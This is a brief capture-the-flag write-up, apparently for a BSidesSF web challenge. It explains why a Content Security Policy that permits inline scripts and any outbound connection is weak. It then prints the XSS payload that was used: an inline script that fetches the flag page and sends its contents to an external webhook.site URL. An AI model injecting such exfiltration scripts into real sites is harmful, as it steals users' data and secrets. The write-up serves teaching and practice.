<img width="1874" height="1259" alt="image" src="https://github.com/user-attachments/assets/4fe65f60-66ea-4bb3-b756-e2e07afb94ff" />

CSP means "Content Security Policy"<br>

3 Things of interest in the CSP:

- `default-src 'self' 'unsafe-inline';`: Only can process responses from the same origin (same protocol, domain and port), allows inline script/styles
- `script-src 'self' 'unsafe-inline';`: Only processes responses from the same origin, allows inline `<script>` tag and event handlers.
- `connect-src *;`: Fetch/XHR can connect to any domain

This is a horrendous CSP. We can exploit the ability to write inline scripts. To do so, we typed out this script into the given payload submission entry at the bottom of the page and pressed enter:
```
<script>
  fetch("https://web-tutorial-1-0c19a827.challenges.bsidessf.net/xss-one-flag")
    .then(response => response.text())
    .then(data => {
      fetch("https://webhook.site/c24daaeb-f658-477f-80a2-7c00b5f4a933/?flag=" + encodeURIComponent(data));
});
</script>
```

<img width="1068" height="656" alt="image" src="https://github.com/user-attachments/assets/018e59b6-32eb-4b04-a3a1-450a066e0fc9" />
